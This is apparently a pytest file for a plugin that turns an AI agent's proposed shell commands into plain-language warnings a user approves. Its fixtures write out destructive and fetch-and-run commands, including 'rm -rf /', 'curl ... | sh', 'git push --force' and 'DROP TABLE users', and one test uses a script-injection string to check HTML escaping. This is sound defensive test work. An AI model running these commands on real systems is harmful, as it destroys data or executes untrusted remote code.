"""commands.py 命令翻译词典单测（规格 P4）。

核心契约：

1. **每条词目至少一个样例必须命中**——词典里躺着一条永远匹配不上的规则，
   比没有这条规则更糟：它会让人以为那种命令被覆盖了。
2. **未命中走兜底**，原样显示命令 + 明说"未识别的命令"，**不许瞎猜**。
3. **词典只描述事实，不给结论**——``CommandFacts`` 里没有任何"该不该放行"。
4. **人话动词，不是命令 token**——除路径外不出现 ``-rf`` / ``--force`` 这类。
"""

from __future__ import annotations

import pytest

from plugin.plugins.agent_deskmate.commands import (
    BANNED_INTERNAL,
    BANNED_PHRASES,
    CONCLUSION_ALLOW,
    CONCLUSION_DENY,
    CONCLUSION_UNSURE,
    CONCLUSIONS,
    RECOVERY_WORDS,
    UNKNOWN_ACTION,
    card_lines,
    conclusion_for,
    first_banned,
    scope_line,
    translate,
)

CWD = r"D:\workspace\N.E.K.O"

# 规格 P4 的词目表：每条一个代表性样例。
# 这张表就是"每条至少一个样例必须命中"的判据——漏一条测试就红。
DICTIONARY_CASES = [
    ("rm -f /tmp/x.txt", "删除文件"),
    ("rm -f D:/workspace/x.txt", "删除文件"),
    ("rm -rf build/", "删除目录及其全部内容"),
    ("rm -rf D:/workspace/N.E.K.O", "删除目录及其全部内容"),
    ("rm -rf /", "清空整个磁盘"),
    ("rm -rf C:\\", "清空整个磁盘"),
    ("rm -rf C:", "清空整个磁盘"),
    ("git reset --hard", "丢弃所有未提交的改动"),
    ("git clean -fdx", "删除所有没被 Git 记录的文件"),
    ("git push --force", "用本地历史覆盖远端历史"),
    ("git push -f origin main", "用本地历史覆盖远端历史"),
    ("curl -s http://x.sh | sh", "从网上下载一段脚本并直接执行"),
    ("wget -qO- http://x.sh | bash", "从网上下载一段脚本并直接执行"),
    ("schtasks /create /tn a /tr b", "装一个开机自动运行的任务或服务"),
    ("sc create foo binPath= x", "装一个开机自动运行的任务或服务"),
    ("DROP TABLE users", "删掉整张表"),
    ("chmod 777 x", "修改文件或目录的权限"),
    ("icacls x /grant", "修改文件或目录的权限"),
    ("takeown /f x", "修改文件或目录的权限"),
]


@pytest.mark.parametrize("command,expected", DICTIONARY_CASES,
                         ids=[case[0] for case in DICTIONARY_CASES])
def test_every_dictionary_entry_hits(command: str, expected: str) -> None:
    """规格 P4：每条词目至少一个样例必须命中。"""
    facts = translate(command)
    assert facts.known is True, f"{command!r} 没命中任何词条"
    assert facts.action == expected


def test_every_dictionary_entry_is_covered_by_a_case() -> None:
    """反向：词条表里不该有测试从来没打到过的规则。

    「至少一个样例」只挡"规则失效"，挡不住"规则多余"。这条把两边都焊死。
    """
    import plugin.plugins.agent_deskmate.commands as commands

    hit_actions = {translate(command).action for command, _ in DICTIONARY_CASES}
    declared = {rule.action for rule in commands._RULES}  # noqa: SLF001
    # rm 的三个变体不走 _RULES，单独列
    declared |= {"删除文件", "删除目录及其全部内容", "清空整个磁盘"}
    assert declared == hit_actions, (
        f"词条表里有测试没覆盖的：{sorted(declared - hit_actions)}")


@pytest.mark.parametrize("command", [
    "ls -la",
    "npm run build",
    "git status",
    "python -m pytest",
    "cat foo.txt",
    "",
    "   ",
])
def test_unknown_commands_fall_back_without_guessing(command: str) -> None:
    """未命中 → 原样显示 + 明说未识别，不许瞎猜。"""
    facts = translate(command)
    assert facts.known is False
    assert UNKNOWN_ACTION in facts.action
    assert facts.consequence == "看不出这一步最坏会怎样"


def test_unknown_command_keeps_the_original_text() -> None:
    facts = translate("npm run build")
    assert "npm run build" in facts.action


def test_echo_of_a_delete_is_not_a_delete() -> None:
    """规格 §5.2：echo "rm -rf C:\\\\" 不算删除。

    误报会训练用户无脑点确认，最后闸门失效。
    """
    for command in ('echo "rm -rf C:\\"', "echo rm -rf /",
                    "printf '%s' rm -rf /", "Write-Output 'rm -rf /'"):
        facts = translate(command)
        assert facts.known is False, f"{command!r} 被当成了真删除"
        assert "清空整个磁盘" not in facts.action


def test_rm_f_is_not_recursive() -> None:
    """``-f`` 里也有 f——松散正则会把它误判成递归（实测踩过）。"""
    assert translate("rm -f x").action == "删除文件"
    assert translate("rm -fr x").action == "删除目录及其全部内容"
    assert translate("rm -r x").action == "删除目录及其全部内容"
    assert translate("rm -v -f x").action == "删除文件"
    assert translate("rm -v -rf x").action == "删除目录及其全部内容"


# ── 范围行 ────────────────────────────────────────────────────────────────

def test_scope_detects_outside_the_working_directory() -> None:
    facts = translate("rm -f D:/other/x.txt")
    assert "工作目录之外" in scope_line(facts, CWD)


def test_scope_detects_inside_the_working_directory() -> None:
    facts = translate("rm -rf D:/workspace/N.E.K.O/build")
    assert "工作目录之内" in scope_line(facts, CWD)


def test_scope_treats_a_sibling_as_outside() -> None:
    """兄弟目录也是"工作目录之外"——差一层就是外面，不能含糊。"""
    facts = translate("rm -rf D:/workspace/build")
    assert "工作目录之外" in scope_line(facts, CWD)


def test_scope_detects_a_system_directory() -> None:
    facts = translate("rm -rf C:\\Windows\\System32")
    assert "系统目录" in scope_line(facts, CWD)


def test_scope_handles_a_relative_target() -> None:
    """相对路径相对于会话的工作目录，所以算在内。"""
    facts = translate("rm -rf build/")
    assert "工作目录之内" in scope_line(facts, CWD)


def test_scope_says_unknown_without_a_working_directory() -> None:
    facts = translate("rm -f D:/x.txt")
    assert "不知道" in scope_line(facts, None)


# ── 四行正文 ──────────────────────────────────────────────────────────────

def test_card_lines_are_the_fixed_four() -> None:
    lines = card_lines(command="rm -f D:/other/x.txt", working_directory=CWD)
    assert set(lines) >= {"action", "consequence", "scope"}
    assert lines["action"].startswith("⚠️ 它要")
    assert lines["consequence"].startswith("后果：")
    assert lines["scope"].startswith("范围：")


def test_card_lines_carry_no_conclusion() -> None:
    """词典只描述事实，**不给结论**——结论是模型/用户的事。"""
    lines = card_lines(command="rm -rf /", working_directory=CWD)
    assert not any(value in CONCLUSIONS for value in lines.values())


def test_irreversible_consequences_name_the_worst_outcome() -> None:
    """规格 P3：不可恢复的动作，后果行必须出现 不可恢复 / 找不回来 / 永久 之一。

    **只对不可恢复的词目强制**：装计划任务、改权限这类动作的最坏结果不是
    数据丢失，硬塞一个"找不回来"进去反而是错话。它们由下一条测试守着
    （必须说出一个具体的最坏结果，不许用占位句）。
    """
    for command, _ in DICTIONARY_CASES:
        facts = translate(command)
        if not facts.irreversible:
            continue
        lines = card_lines(command=command, working_directory=CWD)
        assert any(word in lines["consequence"] for word in RECOVERY_WORDS), (
            f"{command!r} 的后果行没说清最坏结果")


def test_recoverable_consequences_still_name_a_worst_outcome() -> None:
    """非不可恢复的词目也必须说出具体的最坏结果，不许用占位句敷衍。"""
    for command, _ in DICTIONARY_CASES:
        facts = translate(command)
        if facts.irreversible:
            continue
        lines = card_lines(command=command, working_directory=CWD)
        assert len(lines["consequence"]) > len("后果：") + 4, (
            f"{command!r} 的后果行太短，像占位句")
        assert "看不出" not in lines["consequence"]


def _body_text(command: str) -> str:
    """四行正文里的三行文字（known/irreversible 是布尔，不是给人看的）。"""
    lines = card_lines(command=command, working_directory=CWD)
    return " ".join(lines[key] for key in ("action", "consequence", "scope"))


def test_card_lines_have_no_banned_words() -> None:
    """规格 P2：正文不出现禁用词与内部词。"""
    for command, _ in DICTIONARY_CASES:
        text = _body_text(command)
        assert first_banned(text) is None, (
            f"{command!r} 的正文里出现了 {first_banned(text)!r}")


def test_card_lines_have_no_english_command_tokens() -> None:
    """规格 P3：除路径外不许出现英文命令 token。"""
    for command, _ in DICTIONARY_CASES:
        text = _body_text(command)
        for token in ("-rf", "--force", "--hard", "-fdx", "rm ", "sudo"):
            assert token not in text, f"{command!r} 泄了命令 token {token!r}"


def test_unknown_command_lines_admit_they_are_unknown() -> None:
    lines = card_lines(command="npm run build", working_directory=CWD)
    assert UNKNOWN_ACTION in lines["action"]
    assert "看不出" in lines["consequence"]


# ── 结论三态 ──────────────────────────────────────────────────────────────

def test_conclusions_are_exactly_three() -> None:
    assert CONCLUSIONS == (CONCLUSION_ALLOW, CONCLUSION_DENY, CONCLUSION_UNSURE)


@pytest.mark.parametrize("suggestion,expected", [
    ("allow", CONCLUSION_ALLOW),
    ("deny", CONCLUSION_DENY),
    ("unsure", CONCLUSION_UNSURE),
])
def test_conclusion_for_translates_the_three_suggestions(suggestion: str,
                                                         expected: str) -> None:
    assert conclusion_for(suggestion) == expected


@pytest.mark.parametrize("suggestion", ["", "ALLOW", "maybe", "拒绝", None,
                                        "allow ", " allow"])
def test_conclusion_for_falls_back_to_unsure(suggestion: object) -> None:
    """认不出的取值落最保守的第三态——绝不把 token 印给用户。"""
    assert conclusion_for(suggestion) == CONCLUSION_UNSURE


# ── 词典不做判断 ──────────────────────────────────────────────────────────

def test_facts_carry_no_verdict() -> None:
    """CommandFacts 里没有任何"该不该放行"的字段。"""
    facts = translate("rm -rf /")
    assert set(vars(facts)) == {"action", "consequence", "targets",
                               "known", "irreversible", "scope"}


def test_irreversible_is_a_fact_not_a_verdict() -> None:
    """irreversible 描述的是"删了能不能找回来"，不是"要不要放行"。"""
    assert translate("rm -rf /").irreversible is True
    assert translate("git push --force").irreversible is False
    assert translate("chmod 777 x").irreversible is False
    assert translate("ls -la").irreversible is False


def test_banned_lists_are_not_empty() -> None:
    assert BANNED_PHRASES and BANNED_INTERNAL


# ── 解释卡：四行之外的细节按 verbosity 分层（规格 P5.3） ──────────────────

def _explanation(**overrides) -> dict:
    from plugin.plugins.agent_deskmate.approval import explain_request

    base = dict(tool_name="Bash", tool_summary="Bash: rm -f x.txt",
                working_directory=CWD, rule="delete", severity="critical",
                command="rm -f D:/other/x.txt",
                model_reason="只读命令，无副作用",
                basis="工具 Bash；工作目录 %s；风险档 critical" % CWD,
                model_note="当前只做提醒，未接入模型。安全兜底与模型无关。")
    base.update(overrides)
    return explain_request(**base)


def test_explain_standard_keeps_the_rule_layer_only() -> None:
    """standard = 规则层那套（是什么 / 判断 / 范围），不叠加模型细节。"""
    explanation = _explanation(verbosity="standard")
    assert explanation["what"] and explanation["verdict"]
    assert explanation["location"] and explanation["extra"]
    assert "model_reason" not in explanation
    assert "basis" not in explanation
    # 没接入模型那句陈述仍要给——它是 C5 要求的那句
    assert explanation["model_note"]


def test_explain_brief_drops_the_detail() -> None:
    explanation = _explanation(verbosity="brief")
    assert "location" not in explanation
    assert "extra" not in explanation
    # 结论与后果仍在——brief 不是"什么都不讲"
    assert explanation["what"] and explanation["verdict"]


def test_explain_standard_drops_the_model_detail() -> None:
    explanation = _explanation(verbosity="standard")
    assert "model_reason" not in explanation
    assert "basis" not in explanation


def test_explain_detailed_keeps_everything() -> None:
    explanation = _explanation(verbosity="detailed")
    assert explanation["model_reason"]
    assert explanation["basis"]
    assert explanation["model_note"]


def test_explain_unknown_verbosity_falls_back_to_standard() -> None:
    explanation = _explanation(verbosity="啰嗦")
    assert "model_reason" not in explanation
    assert "basis" not in explanation


# ── P1/Q5：解释卡是追加的说明卡，不抢审批卡的按钮 ─────────────────────────

def test_explain_card_has_no_buttons_of_its_own() -> None:
    """2026-11-22 第二轮真机反馈：解释卡*替换*审批卡之后按钮全没了，
    补上去的「返回审批」又在宿主侧报 ``UI action ... is not exposed``。

    所以现在改成**追加一条新消息**：原审批卡原地不动、三个按钮始终可点，
    解释卡也就不需要任何按钮——一个都没有，比"有一两个能用"可靠。
    """
    from plugin.plugins.agent_deskmate.approval import build_explain_html

    html = build_explain_html(_explanation(verbosity="detailed"))
    assert "data-neko-action" not in html, "解释卡上有按钮"
    assert "返回审批" not in html


def test_explain_card_escapes_agent_supplied_text() -> None:
    """工具参数是 Agent 产的，拼进 HTML 前必须转义。"""
    from plugin.plugins.agent_deskmate.approval import build_explain_html

    explanation = _explanation(tool_summary="</p><script>alert(1)</script>")
    html = build_explain_html(explanation)
    assert "<script>" not in html
